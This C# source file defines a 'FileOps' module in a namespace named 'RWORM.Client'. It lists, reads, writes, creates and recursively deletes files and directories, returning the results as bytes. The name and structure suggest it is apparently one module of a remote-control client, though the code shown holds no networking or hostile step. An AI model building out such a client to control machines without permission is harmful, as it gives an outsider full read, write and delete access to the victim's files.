using System;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;

namespace RWORM.Client.Modules
{
    public static class FileOps
    {
        /// List directory contents as JSON.
        public static byte[] ListDirectory(string path)
        {
            var entries = new List<object>();
            try
            {
                var di = new DirectoryInfo(path);
                foreach (var d in di.GetDirectories())
                    entries.Add(new { name = d.Name, type = "dir", size = 0L,
                        modified = d.LastWriteTimeUtc.ToString("o") });
                foreach (var f in di.GetFiles())
                    entries.Add(new { name = f.Name, type = "file", size = f.Length,
                        modified = f.LastWriteTimeUtc.ToString("o") });
            }
            catch (Exception ex)
            {
                return System.Text.Encoding.UTF8.GetBytes(
                    JsonSerializer.Serialize(new[] { new { error = ex.Message } }));
            }
            return System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(entries));
        }

        /// Read file bytes (up to 50 MB).
        public static byte[] ReadFile(string path)
        {
            try
            {
                var fi = new FileInfo(path);
                if (!fi.Exists) return MakeError("File not found");
                if (fi.Length > 50 * 1024 * 1024) return MakeError("File too large (>50 MB)");
                return File.ReadAllBytes(path);
            }
            catch (Exception ex) { return MakeError(ex.Message); }
        }

        /// Write file bytes. Returns OK or error JSON.
        public static byte[] WriteFile(string path, byte[] data)
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(path)!);
                File.WriteAllBytes(path, data);
                return System.Text.Encoding.UTF8.GetBytes("{\"ok\":true}");
            }
            catch (Exception ex) { return MakeError(ex.Message); }
        }

        public static byte[] DeletePath(string path)
        {
            try
            {
                if (Directory.Exists(path)) Directory.Delete(path, true);
                else if (File.Exists(path)) File.Delete(path);
                return System.Text.Encoding.UTF8.GetBytes("{\"ok\":true}");
            }
            catch (Exception ex) { return MakeError(ex.Message); }
        }

        public static byte[] MakeDir(string path)
        {
            try { Directory.CreateDirectory(path); return System.Text.Encoding.UTF8.GetBytes("{\"ok\":true}"); }
            catch (Exception ex) { return MakeError(ex.Message); }
        }

        private static byte[] MakeError(string msg)
            => System.Text.Encoding.UTF8.GetBytes(
                JsonSerializer.Serialize(new { error = msg }));
    }
}
